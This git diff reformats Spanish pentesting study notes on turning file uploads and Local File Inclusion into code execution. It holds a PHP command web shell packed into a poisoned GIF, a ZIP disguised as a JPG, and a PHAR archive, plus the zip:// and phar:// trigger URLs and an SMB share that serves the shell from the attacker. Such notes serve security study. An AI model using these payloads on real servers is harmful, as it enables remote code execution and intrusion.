@@ -73,39 +73,41 @@ Luego podemos levantar distintos tipos de servidores donde alijamos una shell ph
                 impacket-smbserver -smb2support share $(pwd) (este se usaría: \\<OUR_IP>\share\shell.php&cmd=whoami)
 
 
-########################fileuploads
+### fileuploads
 
-###################SUbir imagenes envenenadas
+####SUbir imagenes envenenadas
 podemos subir imagenes envenenadas y aprovechar el LFI para acceder a las mismas con ejecución de código:
 
-http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
+                http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
 
 
-################Zip FILES
+#### Zip FILES
 podemos aprovechar también, si se encuentra permitida, la subida de archivos zip para crear un archivo Zip con 
 extensión JPG:
-echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
+##### Creación
+                echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
 
-http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
+##### Ejecución:
+                http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
 
 
-############### PHAR files
+#### PHAR files
 Podemos aprovechar también los PHAR:
 
-creamos una shell con el siguiente código:
-<?php
-$phar = new Phar('shell.phar');
-$phar->startBuffering();
-$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
-$phar->setStub('<?php __HALT_COMPILER(); ?>');
+##### Creamos una shell con el siguiente código:
+                <?php
+                $phar = new Phar('shell.phar');
+                $phar->startBuffering();
+                $phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
+                $phar->setStub('<?php __HALT_COMPILER(); ?>');
+                
+                $phar->stopBuffering();
 
-$phar->stopBuffering();
+##### Luego:
+                php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
 
-luego:
-php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
-
-luego lo subimos y ejecutamos:
-http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
+##### Luego lo subimos y ejecutamos:
+                http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
 
 
 
